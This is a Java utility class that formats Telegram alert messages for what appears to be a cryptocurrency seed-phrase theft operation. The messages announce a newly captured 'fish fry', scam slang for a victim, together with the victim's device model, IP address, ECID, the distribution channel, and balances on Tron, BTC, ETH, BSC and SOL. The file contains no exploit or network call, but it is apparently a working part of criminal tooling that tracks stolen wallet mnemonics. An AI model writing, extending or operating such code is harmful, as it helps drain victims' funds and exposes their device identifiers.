package com.consume.util;

import java.util.Map;

import com.consume.util.WalletBalanceQuery.ChainBalance;

/**
 * Telegram 消息文案。
 */
public final class MessageFormatUtils {

    private MessageFormatUtils() {}

    public static String saveMnemonicFishTelegram(String groupId,
                                                  String channelCode,
                                                  String channelName,
                                                  String model,
                                                  String ip,
                                                  String ecid,
                                                  String time) {
        StringBuilder sb = new StringBuilder();
        sb.append("🌷🌷🌷新鱼苗获取成功🌷🌷🌷\n\n");
        sb.append("👁️群id: ").append(nullToDefault(groupId)).append("\n");
        sb.append("📔渠道编码：").append(nullToDefault(channelCode)).append("\n");
        sb.append("🦏渠道名称：").append(nullToDefault(channelName)).append("\n");
        sb.append("🙇型号：").append(nullToDefault(model)).append("\n");
        sb.append("📍IP：").append(nullToDefault(ip)).append("\n");
        sb.append("🇪🇨设备ECID：").append(nullToDefault(ecid)).append("\n");
        sb.append("⏰时间：").append(nullToDefault(time)).append("\n");
        return sb.toString();
    }

    public static String saveBalanceTelegram(String groupId,
                                             String channelCode,
                                             String channelName,
                                             Integer mnemonicId,
                                             String model,
                                             String ip,
                                             String ecid,
                                             String time,
                                             Map<String, ChainBalance> balances) {
        StringBuilder sb = new StringBuilder();
        sb.append("🌷🌷🌷新鱼苗金币查询成功🌷🌷🌷\n\n");
        sb.append("👁️群id: ").append(nullToDefault(groupId)).append("\n");
        sb.append("📔渠道编码：").append(nullToDefault(channelCode)).append("\n");
        sb.append("🦏渠道名称：").append(nullToDefault(channelName)).append("\n");
        sb.append("🐠鱼苗词id: ").append(mnemonicId == null ? "-" : String.valueOf(mnemonicId)).append("\n");
        sb.append("🙇型号：").append(nullToDefault(model)).append("\n");
        sb.append("📍IP：").append(nullToDefault(ip)).append("\n");
        sb.append("🇪🇨设备ECID：").append(nullToDefault(ecid)).append("\n");
        sb.append("⏰时间：").append(nullToDefault(time)).append("\n\n");

        ChainBalance tron = bal(balances, "tron");
        ChainBalance btc = bal(balances, "btc");
        ChainBalance eth = bal(balances, "eth");
        ChainBalance bsc = bal(balances, "bsc");
        ChainBalance sol = bal(balances, "sol");

        sb.append("💰Tron: ").append(nz(tron.getNativeBal())).append("trx /")
                .append(nz(tron.getUsdtBal())).append("usdt\n");
        sb.append("💰BTC: ").append(nz(btc.getNativeBal())).append("btc\n");
        sb.append("💰Eth: ").append(nz(eth.getNativeBal())).append("eth/")
                .append(nz(eth.getUsdtBal())).append("usdt\n");
        sb.append("💰BSC: ").append(nz(bsc.getNativeBal())).append("bnb/")
                .append(nz(bsc.getUsdtBal())).append("usdt\n");
        sb.append("💰SOL: ").append(nz(sol.getNativeBal())).append("sol/")
                .append(nz(sol.getUsdtBal())).append("usdt\n");
        return sb.toString();
    }

    private static ChainBalance bal(Map<String, ChainBalance> map, String chain) {
        if (map != null && map.get(chain) != null) return map.get(chain);
        return ChainBalance.zero(chain, null);
    }

    private static String nz(String v) {
        return (v == null || v.isEmpty()) ? "0" : v;
    }

    private static String nullToDefault(String value) {
        return (value == null || value.isEmpty()) ? "-" : value;
    }
}
